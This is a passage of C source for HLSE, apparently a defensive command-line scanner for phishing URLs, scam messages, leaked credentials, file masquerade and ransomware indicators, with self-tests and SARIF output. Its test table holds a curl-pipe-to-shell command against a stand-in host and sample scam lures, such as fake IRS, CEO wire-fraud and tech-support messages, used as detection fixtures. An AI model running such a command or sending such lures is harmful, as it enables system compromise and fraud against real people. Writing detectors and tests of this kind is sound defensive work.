        { "Microsoft Support: Your PC has a virus. Call us at +1-888-FAKE-NUM now",
          50, 100, "Tech support scam" },
        { "Hi sweetie, I'm investing for you. Send Bitcoin and I'll 3x it",
          50, 100, "Pig butchering opener" },
        { "IRS notice: You owe $3,400 in back taxes. Pay immediately to avoid arrest",
          40, 100, "IRS impersonation" },
        { "Install with: curl -fsSL https://sus.xyz/setup.sh | sh",
          40, 100, "curl|sh supply-chain" },
        { "This is the CEO. Wire $25000 to this account immediately and "
          "keep it confidential.",
          60, 100, "CEO-fraud BEC (authority+wire+secrecy)" },
        /* BEC — 'as the ceo' + wire variant */
        { "As the CEO, please wire the initial payment today. "
          "Don't loop in anyone else.",
          40, 100, "BEC: 'as the ceo' + wire payment + secrecy" },
        /* IRS FP regression: 'first' must NOT trigger authority impersonation */
        { "Hello new friend! I am a doctor working overseas. "
          "A small test transaction first.",
          0, 60, "Pig-butchering: 'first' must not fire authority via 'irs' substring" },
        /* Smishing delivery */
        { "Your package has been held. Click to pay the customs clearance fee.",
          20, 60, "Delivery smishing: customs clearance pattern" },
        /* MUST NOT FIRE */
        { "Meeting at 3pm tomorrow", 0, 14, "Plain calendar" },
        { "Can you review the PR by end of day?", 0, 14, "Plain dev message" },
        { "Let's grab coffee this afternoon", 0, 14, "Plain casual" },
        { "I have a bank account at Chase", 0, 14, "Single bait word in legit context" },
        { "The encryption key rotation should happen every 90 days", 0, 30,
          "Technical mention of encryption — borderline" },
    };
    int n = sizeof(cases) / sizeof(cases[0]);

    printf("\n=== Text scam detection self-test ===\n");
    for (i = 0; i < n; i++) {
        TextVerdict v = hlse_check_text(cases[i].input);
        int ok = (v.score >= cases[i].min_score
                  && v.score <= cases[i].max_score);
        printf("%s [%3d in %d..%d]  %s\n",
               ok ? "PASS" : "FAIL",
               v.score, cases[i].min_score, cases[i].max_score,
               cases[i].desc);
        if (!ok) {
            int j;
            printf("       text: %.80s\n", cases[i].input);
            for (j = 0; j < v.n_reasons; j++) {
                printf("       reason: %s\n", v.reasons[j]);
            }
            fail++;
        } else {
            pass++;
        }
    }
    printf("Text tests: %d passed, %d failed\n", pass, fail);
    return fail == 0 ? 0 : 1;
}

/* ─────────────────────────── JSON output ────────────────────────────── */

static void
json_escape(const char *s, char *out, size_t out_size) {
    size_t k = 0;
    while (*s && k < out_size - 7) {
        unsigned char c = (unsigned char)*s;
        switch (c) {
            case '"':  out[k++] = '\\'; out[k++] = '"';  break;
            case '\\': out[k++] = '\\'; out[k++] = '\\'; break;
            case '\n': out[k++] = '\\'; out[k++] = 'n';  break;
            case '\r': out[k++] = '\\'; out[k++] = 'r';  break;
            case '\t': out[k++] = '\\'; out[k++] = 't';  break;
            default:
                if (c < 0x20) {
                    /* control character → \uXXXX (6 chars).
                     * Loop guard (k < out_size - 7) guarantees room.
                     * Write explicitly so the buffer math is provable. */
                    static const char hexd[] = "0123456789abcdef";
                    out[k++] = '\\';
                    out[k++] = 'u';
                    out[k++] = '0';
                    out[k++] = '0';
                    out[k++] = hexd[(c >> 4) & 0xF];
                    out[k++] = hexd[c & 0xF];
                } else {
                    out[k++] = (char)c;
                }
        }
        s++;
    }
    out[k] = '\0';
}

/* ── SARIF 2.1.0 output (GitHub code-scanning compatible) ─────────────────
 *
 * The scan subcommand streams findings as it walks the tree. SARIF needs a
 * single JSON document, so when --sarif is set we accumulate findings into
 * this fixed-capacity buffer and emit them all at the end. The cap is
 * generous; overflow simply truncates the report (a logged note is added).
 *
 * Each finding: file path, 1-based line, rule id, message, score.        */
#define SARIF_MAX_FINDINGS 4096

typedef struct {
    char  path[1024];
    int   line;
    char  rule[32];      /* e.g. "secret", "phishing-url", "file-masquerade" */
    char  message[512];
    int   score;
} SarifFinding;

static SarifFinding g_sarif[SARIF_MAX_FINDINGS];
static int          g_sarif_n = 0;
static int          g_sarif_overflow = 0;

static void
sarif_add(const char *path, int line, const char *rule,
          const char *message, int score) {
    SarifFinding *f;
    if (g_sarif_n >= SARIF_MAX_FINDINGS) { g_sarif_overflow = 1; return; }
    f = &g_sarif[g_sarif_n++];
    snprintf(f->path, sizeof(f->path), "%s", path);
    f->line = line < 1 ? 1 : line;
    snprintf(f->rule, sizeof(f->rule), "%s", rule);
    snprintf(f->message, sizeof(f->message), "%s", message);
    f->score = score;
}

/* Map HLSE 0-100 score to SARIF level + security-severity (0.0-10.0). */
static const char *
sarif_level(int score) {
    if (score >= 60) return "error";
    if (score >= 40) return "warning";
    return "note";
}

static void
sarif_emit(const char *tool_version) {
    int i;
    /* Rule metadata — id, display name, short description, and
     * security-severity (CVSS-like 0–10 for GitHub code scanning).    */
    static const struct {
        const char *id;
        const char *name;
        const char *description;
        const char *severity; /* string to avoid float formatting issues */
    } RULES[] = {
        { "secret",         "Credential Leak",
          "Exposed API key, token, or private key found in source file.",
          "9.0" },
        { "phishing-url",   "Phishing URL",
          "URL exhibits homoglyph, typosquat, or subdomain-spoof phishing indicators.",
          "7.5" },
        { "file-masquerade","File Masquerade",
          "File extension or magic bytes indicate the file is disguised malware.",
          "8.0" },
        { NULL, NULL, NULL, NULL }
    };
    char esc[1280];

    printf("{\n");
    printf("  \"$schema\": \"https://json.schemastore.org/sarif-2.1.0.json\",\n");
    printf("  \"version\": \"2.1.0\",\n");
    printf("  \"runs\": [\n    {\n");
    printf("      \"tool\": {\n        \"driver\": {\n");
    printf("          \"name\": \"HLSE\",\n");
    printf("          \"informationUri\": \"https://github.com/shizukutanaka/hlse\",\n");
    printf("          \"version\": \"%s\",\n", tool_version);
    printf("          \"rules\": [\n");
    for (i = 0; RULES[i].id; i++) {
        printf("            {\n"
               "              \"id\": \"%s\", \"name\": \"%s\",\n"
               "              \"shortDescription\": { \"text\": \"%s\" },\n"
               "              \"properties\": { \"security-severity\": \"%s\" }\n"
               "            }%s\n",
               RULES[i].id, RULES[i].name, RULES[i].description,
               RULES[i].severity, RULES[i+1].id ? "," : "");
    }
    printf("          ]\n        }\n      },\n");
    printf("      \"results\": [\n");
    for (i = 0; i < g_sarif_n; i++) {
        SarifFinding *f = &g_sarif[i];
        double sev = (double)f->score / 10.0;
        printf("        {\n");
        printf("          \"ruleId\": \"%s\",\n", f->rule);
        printf("          \"level\": \"%s\",\n", sarif_level(f->score));
        json_escape(f->message, esc, sizeof(esc));
        printf("          \"message\": { \"text\": \"%s\" },\n", esc);
        printf("          \"properties\": { \"security-severity\": \"%.1f\","
               " \"hlse-score\": %d },\n", sev, f->score);
        printf("          \"locations\": [\n            {\n");
        printf("              \"physicalLocation\": {\n");
        json_escape(f->path, esc, sizeof(esc));
        printf("                \"artifactLocation\": { \"uri\": \"%s\" },\n", esc);
        printf("                \"region\": { \"startLine\": %d }\n", f->line);
        printf("              }\n            }\n          ]\n");
        printf("        }%s\n", (i + 1 < g_sarif_n) ? "," : "");
    }
    printf("      ]\n");
    if (g_sarif_overflow) {
        printf("      ,\"properties\": { \"truncated\": true }\n");
    }
    printf("    }\n  ]\n}\n");
}

static void
print_json_url(const char *url, const Verdict *v) {
    char escaped_url[MAX_URL * 2];
    json_escape(url, escaped_url, sizeof(escaped_url));
    printf("{\"kind\":\"url\",\"target\":\"%s\",\"score\":%d,\"action\":\"%s\",\"reasons\":[",
           escaped_url, v->score, action_for_score(v->score));
    {
        int i;
        for (i = 0; i < v->n_reasons; i++) {
            char esc[256];
            json_escape(v->reasons[i], esc, sizeof(esc));
            printf("%s\"%s\"", i > 0 ? "," : "", esc);
        }
    }
    printf("]}\n");
}

static void
print_json_text(const char *text, const TextVerdict *v) {
    char esc[1024];
    char preview[256];
    /* Truncate long text for the JSON preview */
    {
        size_t n = strlen(text);
        if (n > 120) n = 120;
        memcpy(preview, text, n);
        preview[n] = '\0';
    }
    json_escape(preview, esc, sizeof(esc));
    printf("{\"kind\":\"text\",\"target\":\"%s\",\"score\":%d,\"action\":\"%s\",\"reasons\":[",
           esc, v->score, hlse_text_action_for_score(v->score));
    {
        int i;
        for (i = 0; i < v->n_reasons; i++) {
            char r[256];
            json_escape(v->reasons[i], r, sizeof(r));
            printf("%s\"%s\"", i > 0 ? "," : "", r);
        }
    }
    printf("]}\n");
}

/* ─────────────────────────── stdin pipe mode ────────────────────────── */

static int
stdin_mode(int json_out) {
    char line[MAX_URL];
    int  any_threat = 0;

    while (fgets(line, sizeof(line), stdin)) {
        size_t n = strlen(line);
        while (n > 0 && (line[n-1] == '\n' || line[n-1] == '\r'))
            line[--n] = '\0';
        if (n == 0) continue;

        ScanResult sr = hlse_scan(line);
        if (json_out) {
            /* JSON uses specific formatters for structured output.
             * For text lines, reuse sr (not hlse_check_text alone) so
             * embedded URL extraction is honoured — same as GAP-N fix. */
            if (sr.is_url) {
                Verdict uv = check_url(line);
                print_json_url(line, &uv);
            } else {
                TextVerdict tv;
                int ti;
                memset(&tv, 0, sizeof(tv));
                tv.score = sr.score;
                tv.n_reasons = sr.n_reasons < (int)(sizeof(tv.reasons)/sizeof(tv.reasons[0]))
                               ? sr.n_reasons : (int)(sizeof(tv.reasons)/sizeof(tv.reasons[0]));
                for (ti = 0; ti < tv.n_reasons; ti++)
                    snprintf(tv.reasons[ti], sizeof(tv.reasons[0]),
                             "%s", sr.reasons[ti]);
                print_json_text(line, &tv);
            }
        } else if (sr.score == 0) {
            printf("OK    %s\n", line);
        } else {
            int i;
            printf("%-7s [%d]  %s\n",
                   hlse_action_for_score(sr.score), sr.score, line);
            for (i = 0; i < sr.n_reasons; i++)
                printf("  \xc2\xb7 %s\n", sr.reasons[i]);  /* · */
        }
        if (sr.score >= 60) any_threat = 1;
    }
    return any_threat ? 1 : 0;
}

/* ─────────────────────────── main ─────────────────────────────────── */

static void
print_usage(const char *prog) {
    fprintf(stderr,
        "HLSE %s — Human-Layer Security Engine\n"
        "\n"
        "Scanning:\n"
        "  %s <url>                    Scan a URL for phishing\n"
        "  %s text \"<message>\"         Scan text for scam patterns\n"
        "  %s <any input>              Auto-detect URL or text\n"
        "\n"
        "Protection:\n"
        "  %s protect <path>           Ransomware / SMB / canary check\n"
        "  %s protect /dev/sda --mbr   MBR/GPT integrity (needs root)\n"
        "  %s esp [path]               UEFI/ESP bootkit-string scan\n"
        "  %s scan <directory>          Recursive secret + file scan (CI/CD)\n"
        "  %s secret \"<text>\"          Scan text/stdin for leaked credentials\n"
        "  %s email \"<headers>\"        Email-header forensics (SPF/DKIM, BEC)\n"
        "  %s clipboard <copied> <pasted>  Crypto address-swap (clipper) check\n"
        "  %s package <name> [eco]     Package typosquat check\n"
        "  %s paste \"<command>\"        Pastejacking detection\n"
        "  %s network                  ARP / DNS / hosts safety check\n"
        "  %s file <path>              File masquerade detection\n"
        "  %s audit                    System hardening audit\n"
        "\n"
        "Options:\n"
        "  %s --json <subcommand>      JSON output\n"
        "  %s --sarif scan <dir>       SARIF 2.1.0 output (GitHub code scanning)\n"
        "  %s -q | --quiet             Exit code only (CI/CD mode)\n"
        "  %s --stdin [--json]         Pipe mode (one input per line)\n"
        "  %s --self-test              Built-in tests\n"
        "  %s --benchmark              Corpus benchmark\n"
        "  %s --version | -V           Version\n"
        "  %s -h | --help              Show this help\n"
        "\n"
        "Exit code: 0 = safe, 1 = threat (score >= 60), 2 = usage error\n",
        HLSE_VERSION,
        prog, prog, prog,                                /* scanning: 3 */
        prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, /* protection: 12 */
        prog, prog, prog, prog, prog, prog, prog, prog); /* options: 8 */
}

/* Read all of stdin into buf (NUL-terminated, truncated to cap-1 bytes). */
static size_t
read_stdin_all(char *buf, size_t cap) {
    size_t total = 0, r;
    if (cap == 0) return 0;
    while (total < cap - 1 &&
           (r = fread(buf + total, 1, cap - 1 - total, stdin)) > 0)
        total += r;
    buf[total] = '\0';
    return total;
}

int
main(int argc, char **argv) {
    int json_out = 0;
    int quiet = 0;
    int sarif_out = 0;
    int idx = 1;

    if (argc < 2) {
        /* Apple principle: the first experience IS the product.
         * Instead of a wall of usage text, show a live demo so the
         * user understands in 5 seconds what HLSE does.              */
        printf("HLSE %s — phishing & scam detection\n\n", HLSE_VERSION);

        printf("  Safe URL:\n");
        { Verdict v = check_url("https://github.com");
          printf("    https://github.com");
          printf("  →  %s\n\n", action_for_score(v.score)); }

        printf("  Phishing URL:\n");
        { Verdict v = check_url("https://g00gle.com");
          int i;
          printf("    https://g00gle.com");
          printf("  →  %s [%d/100]\n", action_for_score(v.score), v.score);
          for (i = 0; i < v.n_reasons; i++)
              printf("      %s\n", v.reasons[i]);
          printf("\n"); }

        printf("  Safe message:\n");
        { TextVerdict v = hlse_check_text("Meeting at 3pm tomorrow");
          printf("    \"Meeting at 3pm tomorrow\"");
          printf("  →  %s\n\n", hlse_text_action_for_score(v.score)); }

        printf("  Scam message:\n");
        { TextVerdict v = hlse_check_text(
              "URGENT: Buy iTunes gift cards immediately to unlock your account");
          int i;
          printf("    \"URGENT: Buy iTunes gift cards...\"\n");
          printf("                                     →  %s [%d/100]\n",
                 hlse_text_action_for_score(v.score), v.score);
          for (i = 0; i < v.n_reasons; i++)
              printf("      %s\n", v.reasons[i]);
          printf("\n"); }

        printf("Try it:  %s <url>           Scan a URL\n", argv[0]);
        printf("         %s text \"<msg>\"    Scan text\n", argv[0]);
        printf("         %s package <name>  Check for typosquat\n", argv[0]);
        printf("         %s paste \"<cmd>\"   Check pasted command\n", argv[0]);
        printf("         %s protect <dir>   Ransomware scan\n", argv[0]);
        printf("         %s network         Network safety check\n", argv[0]);
        printf("         %s --help          All options\n", argv[0]);

        return 0;
    }

    /* Parse --json flag (anywhere) */
    {
        int i;
        for (i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--json") == 0) {
                json_out = 1;
                { int j; for (j = i; j < argc - 1; j++) argv[j] = argv[j+1]; argc--; }
                break;
            }
        }
    }

    /* Parse --sarif flag (anywhere). SARIF 2.1.0 for GitHub code scanning;
     * currently supported by the `scan` subcommand. */
    {
        int i;
        for (i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--sarif") == 0) {
                sarif_out = 1;
                { int j; for (j = i; j < argc - 1; j++) argv[j] = argv[j+1]; argc--; }
                break;
            }
        }
    }

    /* Parse -q / --quiet flag (anywhere) — CI/CD mode: exit code only */
    {
        int i;
        for (i = 1; i < argc; i++) {
            if (strcmp(argv[i], "-q") == 0 || strcmp(argv[i], "--quiet") == 0) {
                quiet = 1;
                { int j; for (j = i; j < argc - 1; j++) argv[j] = argv[j+1]; argc--; }
                break;
            }
        }
    }

    /* Quiet mode: redirect stdout to /dev/null. If the redirect fails we must
     * not silently keep printing — that would violate the quiet-mode contract
     * (callers rely on the exit code alone). Report and exit with usage error. */
    if (quiet && !json_out) {
        if (freopen("/dev/null", "w", stdout) == NULL) {
            fprintf(stderr, "Error: --quiet could not redirect stdout\n");
            return 2;
        }
    }

    if (strcmp(argv[idx], "-V") == 0 || strcmp(argv[idx], "--version") == 0) {
        printf("hlse_core %s (built %s)\n", HLSE_VERSION, HLSE_BUILD_DATE);
        printf("Identity: %s\n", HLSE_IDENTITY);
        return 0;
    }
    if (strcmp(argv[idx], "--self-test") == 0) {
        int rc1 = self_test();
        int rc2 = text_self_test();
        return rc1 || rc2 ? 1 : 0;
    }
    if (strcmp(argv[idx], "--benchmark") == 0) {
        return benchmark();
    }
    if (strcmp(argv[idx], "--stdin") == 0) {
        return stdin_mode(json_out);
    }
    if (strcmp(argv[idx], "-h") == 0 || strcmp(argv[idx], "--help") == 0) {
        print_usage(argv[0]);
        return 0;
    }

    /* ── scan subcommand ───────────────────────────────────────────────
     * Recursively scan a directory for secrets + file masquerade.
     * Designed for CI/CD pipelines:
     *   ./hlse_core scan /path/to/project
     *   exit 0 = clean, exit 1 = threats found                        */
    if (strcmp(argv[idx], "scan") == 0) {
        if (argc < idx + 2) {
            fprintf(stderr, "Usage: %s scan <directory>\n", argv[0]);
            return 2;
        }
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
        {
            const char *root = argv[idx + 1];
            int threats = 0, files_scanned = 0, max_depth = 20;
            struct stat root_st;

            /* Verify directory exists and is accessible */
            if (stat(root, &root_st) != 0) {
                fprintf(stderr, "Error: cannot access '%s': %s\n",
                        root, strerror(errno));
                return 2;
            }
            if (!S_ISDIR(root_st.st_mode)) {
                fprintf(stderr, "Error: '%s' is not a directory\n", root);
                return 2;
            }

            /* Simple iterative directory walker using a stack.
             * Avoids unbounded recursion for deeply nested trees.     */
            struct { char path[4096]; int depth; } stack[512];
            int sp = 0;

            /* cppcheck-suppress legacyUninitvar  ; snprintf writes stack[0].path, it is not read uninitialized */
            snprintf(stack[0].path, sizeof(stack[0].path), "%s", root);
            stack[0].depth = 0;
            sp = 1;

            while (sp > 0) {
                char cur_path[4096];
                int depth;
                DIR *d;
                struct dirent *ent;

                sp--;
                snprintf(cur_path, sizeof(cur_path), "%s", stack[sp].path);
                depth = stack[sp].depth;
                d = opendir(cur_path);
                if (!d) continue;

                while ((ent = readdir(d)) != NULL) {
                    char fullpath[8192];
                    struct stat st;
                    if (ent->d_name[0] == '.') continue;

                    if (strlen(cur_path) + strlen(ent->d_name) + 2 >= sizeof(fullpath))
                        continue;  /* path too long — skip */
                    snprintf(fullpath, sizeof(fullpath), "%s/%s",
                             cur_path, ent->d_name);

                    /* Compute path relative to scan root for SARIF URIs.
                     * GitHub code scanning requires relative URIs so it can
                     * map findings back to repo files.                       */
                    const char *sarif_path = fullpath;
                    {
                        size_t rlen = strlen(root);
                        while (rlen > 1 && root[rlen - 1] == '/') rlen--;
                        if (strncmp(fullpath, root, rlen) == 0 &&
                            fullpath[rlen] == '/')
                            sarif_path = fullpath + rlen + 1;
                    }

                    /* lstat (not stat): a symlink is classified as S_ISLNK,
                     * so it is neither recursed into (a symlinked dir would
                     * let the scan escape the target tree or loop) nor read
                     * (a symlinked file like x.env -> /etc/shadow would leak
                     * a file outside the tree). Per SPECIFICATION.md §1.   */
                    if (lstat(fullpath, &st) != 0) continue;

                    if (S_ISDIR(st.st_mode)) {
                        /* Skip vendor/build directories that produce
                         * false positives and slow down scans.
                         * Same list as eslint/ruff/semgrep defaults. */
                        static const char *SKIP_DIRS[] = {
                            "node_modules", "__pycache__", ".venv",
                            "venv", "env", "vendor", "build", "dist",
                            "target", ".tox", ".mypy_cache", ".pytest_cache",
                            ".cargo", ".npm", "coverage", ".next",
                            NULL
                        };
                        int skip = 0;
                        { int k;
                          for (k = 0; SKIP_DIRS[k]; k++) {
                              if (strcmp(ent->d_name, SKIP_DIRS[k]) == 0) {
                                  skip = 1; break;
                              }
                          }
                        }
                        if (skip) continue;

                        if (depth < max_depth && sp < 510) {
                            snprintf(stack[sp].path, sizeof(stack[sp].path),
                                     "%s", fullpath);
                            stack[sp].depth = depth + 1;
                            sp++;
                        }
                        continue;
                    }

                    if (!S_ISREG(st.st_mode)) continue;
                    files_scanned++;

                    /* Check 1: file masquerade */
                    FileVerdict fv = hlse_check_file(fullpath);
                    if (fv.score >= 40) {
                        threats++;
                        if (sarif_out) {
                            char msg[512] = {0};
                            int i;
                            for (i = 0; i < fv.n_reasons; i++) {
                                size_t l = strlen(msg);
                                snprintf(msg + l, sizeof(msg) - l, "%s%s",
                                         i ? "; " : "", fv.reasons[i]);
                            }
                            sarif_add(sarif_path, 1, "file-masquerade",
                                      msg[0] ? msg : "file masquerade", fv.score);
                        } else if (json_out) {
                            int i;
                            char esc[512];
                            json_escape(fullpath, esc, sizeof(esc));
                            printf("{\"kind\":\"file\",\"path\":\"%s\","
                                   "\"score\":%d,\"action\":\"%s\",\"reasons\":[",
                                   esc, fv.score, hlse_action_for_score(fv.score));
                            for (i = 0; i < fv.n_reasons; i++) {
                                json_escape(fv.reasons[i], esc, sizeof(esc));
                                printf("%s\"%s\"", i ? "," : "", esc);
                            }
                            printf("]}\n");
                        } else {
                            int i;
                            printf("%-7s [%d]  %s\n",
                                   hlse_action_for_score(fv.score),
                                   fv.score, fullpath);
                            for (i = 0; i < fv.n_reasons; i++)
                                printf("  \xc2\xb7 %s\n", fv.reasons[i]);
                        }
                    }

                    /* Check 2: secrets in text files (< 1MB) */
                    if (st.st_size > 0 && st.st_size < 1048576) {
                        /* Re-open with O_NOFOLLOW + S_ISREG (defends the
                         * lstat→open TOCTOU window); never follow a symlink
                         * swapped in after classification. */
                        FILE *fp = NULL;
                        int sfd = open(fullpath, O_RDONLY | O_NOFOLLOW | O_NONBLOCK);
                        if (sfd >= 0) {
                            struct stat sst;
                            if (fstat(sfd, &sst) == 0 && S_ISREG(sst.st_mode))
                                fp = fdopen(sfd, "r");
                            if (!fp) close(sfd);
                        }
                        if (fp) {
                            char line[4096];
                            int lineno = 0;
                            while (fgets(line, sizeof(line), fp)) {
                                lineno++;
                                SecretVerdict sv = hlse_scan_secrets(line);
                                if (sv.score >= 40) {
                                    threats++;
                                    if (sarif_out) {
                                        char msg[512] = {0};
                                        int i;
                                        for (i = 0; i < sv.n_findings; i++) {
                                            size_t l = strlen(msg);
                                            snprintf(msg + l, sizeof(msg) - l, "%s%s",
                                                     i ? "; " : "",
                                                     sv.findings[i].description);
                                        }
                                        sarif_add(sarif_path, lineno, "secret",
                                                  msg[0] ? msg : "secret", sv.score);
                                    } else if (json_out) {
                                        int i;
                                        char esc_p[512], et[64], ed[512];
                                        json_escape(fullpath, esc_p, sizeof(esc_p));
                                        /* Emit findings:[{type,description}] per spec §5.2
                                         * (same schema as the standalone secret subcommand). */
                                        printf("{\"kind\":\"secret\","
                                               "\"path\":\"%s\","
                                               "\"line\":%d,\"score\":%d,"
                                               "\"action\":\"%s\",\"findings\":[",
                                               esc_p, lineno, sv.score,
                                               hlse_action_for_score(sv.score));
                                        for (i = 0; i < sv.n_findings; i++) {
                                            json_escape(sv.findings[i].type, et, sizeof(et));
                                            json_escape(sv.findings[i].description, ed, sizeof(ed));
                                            printf("%s{\"type\":\"%s\",\"description\":\"%s\"}",
                                                   i ? "," : "", et, ed);
                                        }
                                        printf("]}\n");
                                    } else {
                                        int i;
                                        printf("%-7s [%d]  %s:%d\n",
                                               hlse_action_for_score(sv.score),
                                               sv.score, fullpath, lineno);
                                        for (i = 0; i < sv.n_findings; i++)
                                            printf("  \xc2\xb7 %s\n",
                                                   sv.findings[i].description);
                                    }
                                }

                                /* Check 3: phishing URLs embedded in text */
                                {
                                    const char *p = line;
                                    while ((p = strstr(p, "http")) != NULL) {
                                        if (strncmp(p, "http://", 7) != 0 &&
                                            strncmp(p, "https://", 8) != 0) {
                                            p += 4; continue;
                                        }
                                        char url_buf[2048];
                                        int ui = 0;
                                        while (p[ui] && p[ui] != ' ' && p[ui] != '\t'
                                               && p[ui] != '\n' && p[ui] != '"'
                                               && p[ui] != '\'' && p[ui] != '>'
                                               && p[ui] != ')' && ui < 2047) {
                                            url_buf[ui] = p[ui]; ui++;
                                        }
                                        url_buf[ui] = '\0';
                                        {
                                            Verdict uv = check_url(url_buf);
                                            if (uv.score >= 40) {
                                                threats++;
                                                if (sarif_out) {
                                                    char msg[512] = {0};
                                                    int k;
                                                    size_t l0 = strlen(url_buf) < 200 ?
                                                                strlen(url_buf) : 200;
                                                    snprintf(msg, sizeof(msg),
                                                             "Phishing URL: %.*s — ",
                                                             (int)l0, url_buf);
                                                    for (k = 0; k < uv.n_reasons; k++) {
                                                        size_t l = strlen(msg);
                                                        snprintf(msg + l, sizeof(msg) - l,
                                                                 "%s%s", k ? "; " : "",
                                                                 uv.reasons[k]);
                                                    }
                                                    sarif_add(sarif_path, lineno,
                                                              "phishing-url", msg, uv.score);
                                                } else if (json_out) {
                                                    char eu[2048];
                                                    json_escape(url_buf, eu, sizeof(eu));
                                                    printf("{\"kind\":\"url\",\"path\":\"%s\","
                                                           "\"line\":%d,\"url\":\"%s\","
                                                           "\"score\":%d,\"action\":\"%s\","
                                                           "\"reasons\":[",
                                                           fullpath, lineno, eu, uv.score,
                                                           hlse_action_for_score(uv.score));
                                                    { int kr;
                                                      for (kr = 0; kr < uv.n_reasons; kr++) {
                                                          char er[256];
                                                          json_escape(uv.reasons[kr], er, sizeof(er));
                                                          printf("%s\"%s\"", kr>0?",":"", er);
                                                      }
                                                    }
                                                    printf("]}\n");
                                                } else {
                                                    int k;
                                                    printf("%-7s [%d]  %s:%d  %s\n",
                                                           hlse_action_for_score(uv.score),
                                                           uv.score, fullpath, lineno, url_buf);
                                                    for (k = 0; k < uv.n_reasons; k++)
                                                        printf("  \xc2\xb7 %s\n", uv.reasons[k]);
                                                }
                                            }
                                        }
                                        p += ui;
                                    }
                                }
                            }
                            fclose(fp);
                        }
                    }
                }
                closedir(d);
            }

            if (sarif_out) {
                sarif_emit(HLSE_VERSION);
            } else if (!json_out) {
                if (threats == 0) {
                    printf("OK    %s (%d files scanned, 0 threats)\n",
                           root, files_scanned);
                } else {
                    printf("\n%d threat(s) in %d files under %s\n",
                           threats, files_scanned, root);
                }
            } else {
                /* NDJSON: final summary line for CI tooling */
                char esc_root[4096];
                json_escape(root, esc_root, sizeof(esc_root));
                printf("{\"kind\":\"scan_summary\",\"target\":\"%s\","
                       "\"files_scanned\":%d,\"threats\":%d}\n",
                       esc_root, files_scanned, threats);
            }
            return threats > 0 ? 1 : 0;
        }
#pragma GCC diagnostic pop
    }

    /* ── protect subcommand ──────────────────────────────────────────
     * Usage: hlse_core protect <path> [--ransomware|--smb|--mbr|--net]
     * Without flags: runs all modules applicable to the path.        */
    if (strcmp(argv[idx], "protect") == 0) {
        if (argc < idx + 2) {
            fprintf(stderr, "Usage: %s protect <path> [--ransomware|--smb|--mbr|--net]\n", argv[0]);
            return 2;
        }
        {
            const char *path = argv[idx + 1];
            int modules = 0;

            /* Verify path exists */
            if (access(path, F_OK) != 0) {
                fprintf(stderr, "Error: cannot access '%s': %s\n",
                        path, strerror(errno));
                return 2;
            }
            int ai;

            /* Parse module flags */
            for (ai = idx + 2; ai < argc; ai++) {
                if (strcmp(argv[ai], "--ransomware") == 0) modules |= HLSE_PROTECT_RANSOMWARE;
                else if (strcmp(argv[ai], "--smb") == 0)   modules |= HLSE_PROTECT_SMB;
                else if (strcmp(argv[ai], "--mbr") == 0)   modules |= HLSE_PROTECT_MBR;
                else if (strcmp(argv[ai], "--net") == 0)    modules |= HLSE_PROTECT_NETWORK_DRIVE;
            }
            if (modules == 0) {
                /* Auto-detect: if path starts with /dev/, use MBR; else file-based */
                if (strncmp(path, "/dev/", 5) == 0) {
                    modules = HLSE_PROTECT_MBR;
                } else {
                    modules = HLSE_PROTECT_RANSOMWARE | HLSE_PROTECT_SMB | HLSE_PROTECT_NETWORK_DRIVE;
                }
            }

            ProtectionVerdict pv = hlse_protect_scan(path, modules);

            if (json_out) {
                /* JSON output for protect */
                char esc_path[4096];
                json_escape(path, esc_path, sizeof(esc_path));
                printf("{\"kind\":\"protect\",\"target\":\"%s\",\"score\":%d,"
                       "\"action\":\"%s\",\"reasons\":[",
                       esc_path, pv.score,
                       hlse_action_for_score(pv.score));
                {
                    int i;
                    for (i = 0; i < pv.n_reasons; i++) {
                        char esc[512];
                        json_escape(pv.reasons[i], esc, sizeof(esc));
                        printf("%s\"%s\"", i > 0 ? "," : "", esc);
                    }
                }
                printf("]}\n");
            } else if (pv.score == 0) {
                printf("OK    %s\n", path);
            } else {
                int i;
                printf("%-7s [%d]  %s\n",
                       hlse_action_for_score(pv.score), pv.score, path);
                for (i = 0; i < pv.n_reasons; i++) {
                    printf("  \xc2\xb7 %s\n", pv.reasons[i]);
                }
            }
            return pv.score >= 60 ? 1 : 0;
        }
    }

    if (strcmp(argv[idx], "esp") == 0) {
        /* EFI System Partition integrity (UEFI bootkit indicators). */
        const char *path = (argc > idx + 1) ? argv[idx + 1] : NULL;
        ProtectionVerdict pv = hlse_esp_verify(path);
        if (json_out) {
            int i;
            printf("{\"kind\":\"esp\",\"score\":%d,\"action\":\"%s\","
                   "\"reasons\":[", pv.score, hlse_action_for_score(pv.score));
            for (i = 0; i < pv.n_reasons; i++) {
                char esc[512];
                json_escape(pv.reasons[i], esc, sizeof(esc));
                printf("%s\"%s\"", i > 0 ? "," : "", esc);
            }
            printf("]}\n");
        } else if (pv.score == 0) {
            printf("OK    (esp)%s%s\n",
                   pv.n_reasons ? " — " : "",
                   pv.n_reasons ? pv.reasons[0] : "");
        } else {
            int i;
            printf("%-7s [%d]  (esp)\n",
                   hlse_action_for_score(pv.score), pv.score);
            for (i = 0; i < pv.n_reasons; i++)
                printf("  \xc2\xb7 %s\n", pv.reasons[i]);
        }
        return pv.score >= 60 ? 1 : 0;
    }

    /* ── Supply Chain Defense subcommands ───────────────────────────── */

    if (strcmp(argv[idx], "package") == 0) {
        if (argc < idx + 2) {
            fprintf(stderr, "Usage: %s package <name> [pip|npm|cargo|go]\n",
                    argv[0]);
            return 2;
        }
        {
            const char *eco = (argc > idx + 2) ? argv[idx + 2] : NULL;
            PackageVerdict pv = hlse_check_package(argv[idx + 1], eco);
            if (json_out) {
                printf("{\"kind\":\"package\",\"name\":\"%s\",\"score\":%d,"
                       "\"action\":\"%s\"",
                       argv[idx + 1], pv.score, hlse_action_for_score(pv.score));
                if (pv.n_matches > 0) {
                    int i;
                    printf(",\"matches\":[");
                    for (i = 0; i < pv.n_matches; i++) {
                        printf("%s{\"name\":\"%s\",\"registry\":\"%s\","
                               "\"distance\":%d}",
                               i > 0 ? "," : "",
                               pv.matches[i].legit_name,
                               pv.matches[i].registry,
                               pv.matches[i].distance);
                    }
                    printf("]");
                }
                printf("}\n");
            } else if (pv.score == 0) {
                printf("OK    %s\n", argv[idx + 1]);
            } else {
                printf("%-7s [%d]  %s\n",
                       hlse_action_for_score(pv.score), pv.score,
                       argv[idx + 1]);
                if (pv.reason[0])
                    printf("  \xc2\xb7 %s\n", pv.reason);
            }
